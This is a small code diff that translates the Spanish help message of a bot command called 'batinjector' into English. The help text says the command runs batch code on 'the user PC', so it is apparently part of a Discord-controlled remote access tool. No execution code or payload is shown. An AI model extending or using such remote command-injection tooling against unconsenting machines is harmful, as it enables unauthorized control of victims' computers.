@@ -142,7 +142,7 @@ async def batinjector(message, *,args=None):
 
     
     if args == None: 
-        return await message.reply(f'**insert Batch Code on the user PC.**\n Example:\n```\n{prefix}batinjector <JUSTIFICATION [Batch Code]>\n Example de uso:\n\n{prefix}batinjector @echo off\nstart https://youtube.com```')
+        return await message.reply(f'**insert Batch Code on the user PC.**\n Example:\n```\n{prefix}batinjector <JUSTIFICATION [Batch Code]>\n Usage example:\n\n{prefix}batinjector @echo off\nstart https://youtube.com```')
     else:
         code =  args
         
